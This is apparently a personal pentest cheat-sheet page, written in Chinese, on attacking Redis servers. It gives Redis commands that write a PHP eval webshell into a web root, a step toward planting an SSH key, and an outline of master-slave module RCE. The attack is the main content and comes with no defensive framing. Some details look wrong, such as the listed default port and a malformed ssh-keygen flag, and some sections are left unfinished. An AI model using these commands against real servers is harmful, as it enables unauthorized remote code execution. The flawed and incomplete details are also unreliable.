---
title: "Redis"
date: 2025-09-21
tags:
  - Others
categories:
  - Others
description: None
---
默认端口：6307

## Redis 漏洞

getshell

```shell
# 写webshell
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php @eval($_POST['attack']);?>"
save

# 写ssh公钥
# 生成一对公私钥
ssh-keygen -q -tt rsa -f /root/.ssh/id_rsa -N ''

# 设置定时任务


```


redis 主从 RCE

主从同步数据，**模块功能**

控制 主Redis ，编写恶意模块，同步模块到 从Redis